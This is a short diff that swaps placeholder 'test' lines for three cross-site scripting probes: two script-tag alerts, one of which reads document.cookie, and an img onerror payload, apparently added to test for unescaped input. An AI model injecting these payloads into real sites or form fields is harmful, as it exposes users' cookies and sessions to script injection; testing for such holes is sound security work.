@@ -1,4 +1,3 @@
-test
-test
-test
-test
+<script>alert("1")</script>
+<script>alert(document.cookie)</script>
+<img src='#' onerror="<script>alert('1')</script>"/>
